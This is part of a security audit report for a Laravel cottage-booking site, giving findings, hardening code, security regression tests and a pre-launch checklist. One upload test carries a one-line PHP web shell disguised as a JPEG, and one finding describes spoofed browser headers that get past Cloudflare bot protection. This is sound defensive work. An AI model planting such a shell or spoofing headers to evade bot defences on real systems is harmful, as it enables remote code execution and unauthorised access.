## F14 — Spoofed browser headers on `publicHttp()` · **Informational**

```php
protected const BROWSER_HEADERS = [
    'User-Agent'      => 'Mozilla/5.0 (Macintosh; …) Chrome/126.0.0.0 Safari/537.36',
    'Accept'          => 'application/json, text/plain, */*',
    'Sec-Fetch-Dest'  => 'empty',
    …
];
// plus Referer and Origin set to lodgify.public_site_origin
```

Not a vulnerability in this application — it is calling **its own vendor's** public
endpoint, on behalf of the account holder, for data the account holder owns. Included here
because it carries two real risks worth tracking:

1. **Fragility.** Cloudflare rule changes will break it without notice. The code already
   treats it as a "best-effort fallback only" and every call site is wrapped in `safe()`,
   so a failure degrades rather than breaks — that is the right containment.
2. **Terms of service.** Circumventing a bot-protection layer may conflict with
   Lodgify's ToS. Worth a written confirmation from Lodgify, especially since every
   *authenticated* path (`api.lodgify.com` with `X-ApiKey`) is documented and supported.
   The comment in `config/lodgify.php` already flags the equivalent concern for
   `LODGIFY_DASHBOARD_COOKIE`.

---

## F15 — No audit log on the admin surface · **Low**

Admin actions mutate records with no immutable trail. The models record *who last
touched* something (`handled_by`, `reviewed_by`, `reviewed_at`) and status milestones
(`contacted_at`, `quoted_at`, `closed_at`, `read_at`, `replied_at`) — which is more than
most projects — but there is no record of:

- who **deleted** an enquiry (soft-deleted rows keep `handled_by`, not the deleter);
- who **rejected** a photo and why, beyond the current values;
- **failed** admin authorization attempts (`abort_unless` in `EnsureUserIsAdmin` logs
  nothing).

At minimum, log the 403:

```php
// EnsureUserIsAdmin::handle()
if (! $user->isAdmin()) {
    Log::warning('Non-admin attempted to access admin area', [
        'user_id' => $user->id,
        'email'   => $user->email,
        'path'    => $request->path(),
        'ip'      => $request->ip(),
    ]);
    abort(403, 'This area is for site administrators.');
}
```

`last_login_at` / `last_login_ip` on `users` are already recorded by
`LoginController::store()`, which is a good start.

---

## F16 — No security regression tests · **Medium (process)**

`tests/` contains only the framework's two example tests. None of the controls documented
in Part 1 are pinned by a test, so every one of them can be silently removed by a future
refactor. See [§3.6](#36-f16--pin-the-controls-with-tests) for a starter suite.

---

# Part 3 — Recommended hardening, with code

Ordered by (impact ÷ effort).

## 3.1 F1 — Stop emitting `public` on session-bearing responses

Immediate one-line fixes:

```php
// AvailabilityController::month()  and  RateController::month()
->header('Cache-Control', 'private, max-age=60');

// RateController::addons()
->header('Cache-Control', 'private, max-age=300');
```

Then do it properly by moving `/api/*` out of the session group (see F1 above), at which
point `public` is safe and a CDN can absorb the calendar load.

## 3.2 F2 — Add a security-headers middleware

```php
// app/Http/Middleware/SecurityHeaders.php
namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Symfony\Component\HttpFoundation\Response;

class SecurityHeaders
{
    public function handle(Request $request, Closure $next): Response
    {
        $response = $next($request);

        $response->headers->set('X-Content-Type-Options', 'nosniff');
        $response->headers->set('X-Frame-Options', 'SAMEORIGIN');
        $response->headers->set('Referrer-Policy', 'strict-origin-when-cross-origin');
        $response->headers->set('Permissions-Policy',
            'camera=(), microphone=(), geolocation=(), payment=()');
        $response->headers->set('Cross-Origin-Opener-Policy', 'same-origin');

        if ($request->isSecure()) {
            $response->headers->set('Strict-Transport-Security',
                'max-age=31536000; includeSubDomains');
        }

        // Report-only first. Watch the reports for a week, then switch the header
        // name to Content-Security-Policy.
        $response->headers->set('Content-Security-Policy-Report-Only', implode('; ', [
            "default-src 'self'",
            // Alpine.js evaluates x-data expressions, so it needs unsafe-eval
            // unless you adopt Alpine's CSP build. Blade inlines the @js payloads,
            // so unsafe-inline is needed for scripts until those move to data-*
            // attributes read via JSON.parse.
            "script-src 'self' 'unsafe-eval' 'unsafe-inline'",
            "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
            "font-src 'self' https://fonts.gstatic.com data:",
            "img-src 'self' data: https://l.icdbcdn.com https://*.googleusercontent.com "
                . "https://*.lodgify.com",
            "frame-src https://www.google.com https://maps.google.com",
            "connect-src 'self'",
            "form-action 'self'",
            "base-uri 'self'",
            "object-src 'none'",
            "frame-ancestors 'self'",
            'upgrade-insecure-requests',
        ]));

        return $response;
    }
}
```

```php
// bootstrap/app.php
->withMiddleware(function (Middleware $middleware): void {
    $middleware->alias(['admin' => EnsureUserIsAdmin::class]);
    $middleware->append(\App\Http\Middleware\SecurityHeaders::class);
})
```

**`Referrer-Policy` is the highest-value single line here.** Without it,
`/reset-password/{token}` and `/verify-email/{id}/{hash}` — both of which *are*
credentials — leak in the `Referer` header to Google Fonts and the Maps iframe on any page
that follows. `strict-origin-when-cross-origin` sends only the origin cross-site.

The image and frame sources above are derived from what the code actually loads:
`l.icdbcdn.com` (`lodgify.image_cdn_base`), Google Places photos via
`GoogleReviewsService::resolvePhotoUri()`, and `Cottage::mapEmbedUrl()`. Verify against
your own network panel before enforcing.

## 3.3 F9 + F10 — Trust proxies and pin cookie flags

See [F9](#f9--no-trustproxies-configuration--medium) for the middleware and
[F10](#f10--session-cookie-flags-not-pinned-for-production--medium) for the `.env` block.
Do these together — `SESSION_SECURE_COOKIE=true` depends on `$request->isSecure()` being
accurate, which depends on `TrustProxies` seeing `X-Forwarded-Proto`.

## 3.4 F4 — Explicit `$fillable`

```php
// app/Models/ContactMessage.php
protected $fillable = ['name', 'email', 'phone', 'subject', 'message',
                       'ip_address', 'user_agent'];

// app/Models/GuestPhoto.php
protected $fillable = ['guest_name', 'guest_email', 'caption', 'cottage_id',
                       'cottage_name', 'stayed_on', 'original_name', 'mime',
                       'size_bytes', 'width', 'height', 'consent_given',
                       'ip_address', 'user_agent'];
// NOT fillable: status, disk, path, is_featured, sort_order, reviewed_by,
//               reviewed_at, rejection_reason — all set explicitly by the
//               moderation controller, never from a request.

// app/Models/BusinessStayRequest.php
protected $fillable = ['company_name','industry','website','tax_number',
                       'contact_name','job_title','email','phone',
                       'check_in','check_out','dates_flexible','flexible_note',
                       'guests_count','cottages_count','purpose',
                       'budget_per_night','currency','needs_invoice',
                       'needs_meeting_space','pets','message','source',
                       'ip_address','user_agent'];

// app/Models/CheckoutIntent.php
protected $fillable = ['cottage_id','cottage_name','arrival','departure','nights',
                       'adults','children','pets','quoted_total','currency',
                       'addons','redirect_url','status','referrer',
                       'utm_source','utm_medium','utm_campaign',
                       'ip_address','user_agent','session_id'];
```

Note `Admin\GuestPhotoController` already uses `forceFill()` on the moderation writes
(`reject`) and explicit arrays on `approve`, so restricting `$fillable` requires no other
changes there. Run the test suite after — this is the change most likely to surface a
call site that was silently relying on `$guarded = []`.

## 3.5 F6 — Validate, then hash cache keys

Add the `validate()` block from [F6](#f6--cottagecontrollershow-does-not-validate-query-parameters--medium),
and apply the hashed-key pattern to all three interpolated key builders in
`LodgifyRepository` (`avail:`, `ratesraw:`, `quote:`). Also add a `throttle` to
`/cottage/{slug}` — it is currently the only uncapped route that can trigger an upstream
call and a cache write:

```php
Route::get('/cottage/{slug}', [CottageController::class, 'show'])
    ->middleware('throttle:120,1')
    ->name('cottage.show');
```

## 3.6 F16 — Pin the controls with tests

```php
// tests/Feature/Security/AdminAuthorizationTest.php
public function test_guest_is_redirected_to_login(): void
{
    $this->get('/admin/business-stays')->assertRedirect('/login');
}

public function test_signed_in_non_admin_gets_403_not_a_login_redirect(): void
{
    $this->actingAs(User::factory()->create(['is_admin' => false]))
         ->get('/admin/business-stays')
         ->assertForbidden();
}

public function test_every_admin_route_is_gated(): void
{
    $user = User::factory()->create(['is_admin' => false]);

    collect(Route::getRoutes())
        ->filter(fn ($r) => str_starts_with($r->uri(), 'admin'))
        ->each(fn ($r) => $this->actingAs($user)
            ->call($r->methods()[0], '/'.$r->uri())
            ->assertForbidden());
}
```

```php
// tests/Feature/Security/ReservationOwnershipTest.php
public function test_a_user_cannot_read_another_guests_reservation(): void
{
    // ReservationRepository is bound to a fake returning a booking for someone else
    $this->actingAs($this->verifiedUser('mine@example.com'))
         ->get('/my-stays/12345')
         ->assertRedirect(route('profile.index'))
         ->assertSessionHas('profile_error');
}

public function test_unverified_user_cannot_reach_my_stays(): void
{
    $user = User::factory()->unverified()->create();
    $this->actingAs($user)->get('/my-stays')->assertRedirect(route('verification.notice'));
}
```

```php
// tests/Feature/Security/PhotoModerationTest.php
public function test_pending_photo_has_no_public_url(): void
{
    $photo = GuestPhoto::factory()->pending()->create();
    $this->assertNull($photo->url);
}

public function test_pending_file_route_requires_admin(): void
{
    $photo = GuestPhoto::factory()->pending()->create();
    $this->actingAs(User::factory()->create(['is_admin' => false]))
         ->get(route('admin.photos.file', $photo))
         ->assertForbidden();
}

public function test_upload_rejects_a_php_file_renamed_as_jpg(): void
{
    Storage::fake('local');
    $this->post('/share-your-photos', [
        'guest_name' => 'A', 'guest_email' => 'a@b.co', 'consent_given' => 1,
        'photos' => [UploadedFile::fake()->createWithContent('shell.jpg', '<?php system($_GET[0]);')],
    ])->assertSessionHasErrors('photos.0');

    Storage::disk('local')->assertDirectoryEmpty('guest-photos/pending');
}

public function test_honeypot_blocks_submission(): void
{
    $this->post('/contact', [
        'name' => 'Bot', 'email' => 'b@b.co', 'message' => 'x'.str_repeat('y', 20),
        'website_url' => 'http://spam.example',
    ])->assertSessionHasErrors('website_url');

    $this->assertDatabaseCount('contact_messages', 0);
}
```

```php
// tests/Feature/Security/ResponseHeadersTest.php
public function test_api_responses_are_not_publicly_cacheable(): void
{
    $this->get('/api/availability/month?start='.now()->toDateString())
         ->assertHeader('Cache-Control', 'private, max-age=60');
}

public function test_security_headers_are_present(): void
{
    $this->get('/')
         ->assertHeader('X-Content-Type-Options', 'nosniff')
         ->assertHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
}
```

## 3.7 Longer-term

| Item | Why |
|---|---|
| **2FA for admin accounts** | `is_admin` accounts can read every enquiry's contact details. `laravel/fortify` adds TOTP with little code. |
| **Error aggregation (Sentry/Flare)** | `safe()` swallows failures by design. Without aggregation, a fully-degraded site looks healthy — and a rising rate of Lodgify 403s is exactly the signal you want. |
| **`ReservationPolicy` / `GuestPhotoPolicy`** | Moves the ownership rule out of a controller so a second read path cannot forget it. |
| **Dependency scanning in CI** | `composer audit` + `npm audit` on every push. |
| **Restrict the Google Places key** | To the Places API and the server IP, as `config/services-google.php` already advises. An unrestricted key on a public site is a billing incident. |
| **Rotate `LODGIFY_API_KEY` on a schedule** | It grants read access to every reservation, including guest contact details. |
| **Remove `config/services-google.php`** | A config file nothing reads is a trap for the next person who edits it (see [`01-architecture.md` D4](01-architecture.md)). |

---

# Part 4 — Pre-launch checklist

## Environment

- [ ] `APP_DEBUG=false`
- [ ] `APP_ENV=production` (this is also what removes the `/debug/lodgify/*` routes)
- [ ] `APP_KEY` generated and unique to this deployment
- [ ] `APP_URL` set to the canonical HTTPS origin
- [ ] `SESSION_SECURE_COOKIE=true`
- [ ] `SESSION_ENCRYPT=true`
- [ ] `SESSION_SAME_SITE=lax` (**not** `strict` — breaks the Lodgify checkout return)
- [ ] `TRUSTED_PROXIES` set to the real proxy IPs/CIDRs, never `*`
- [ ] `LOG_LEVEL=warning` or above (`.env.example` ships `debug`)
- [ ] `MAIL_MAILER` set to a real transport (`.env.example` ships `log`)
- [ ] `LODGIFY_DASHBOARD_COOKIE` **empty**
- [ ] Google Places key restricted to the Places API + server IP

## Code

- [ ] F1 — no `Cache-Control: public` on any session-bearing route
- [ ] F2 — `SecurityHeaders` middleware registered; CSP moved from report-only to enforcing
- [ ] F3 — `$cottage->description` sanitised with an attribute-stripping purifier
- [ ] F4 — explicit `$fillable` on all four local models
- [ ] F5 — `Content-Type` on the photo route allowlisted, `nosniff` set
- [ ] F6 — `CottageController::show()` validates its query parameters; cache keys hashed; route throttled
- [ ] F7 — password change rotates `remember_token` and calls `logoutOtherDevices()`
- [ ] F8 — `/debug/lodgify/flush` is a POST (and ideally the whole debug group is auth-gated even in staging)
- [ ] F11 — `reject()` fails closed when the unpublish copy throws
- [ ] F12 — enquiry notification emails uncommented, queued, and `mail.enquiries_to` defined
- [ ] D1 — `SyncCottageAvailability` implemented or the `Schedule::command()` block removed

## Infrastructure

- [ ] HTTPS enforced at the edge; HTTP redirects to HTTPS
- [ ] `storage/` and `bootstrap/cache/` writable, and **not** web-reachable
- [ ] `public/storage` symlink present (`php artisan storage:link`) so approved photos resolve
- [ ] SQLite database file (if retained) outside the webroot, and backed up
- [ ] `php artisan config:cache route:cache view:cache` run **in the target environment**
- [ ] Rate limits verified end to end from a real client IP (proves `TrustProxies` works)
- [ ] Error aggregation receiving events
- [ ] `/up` extended to assert Lodgify reachability and cache/database health
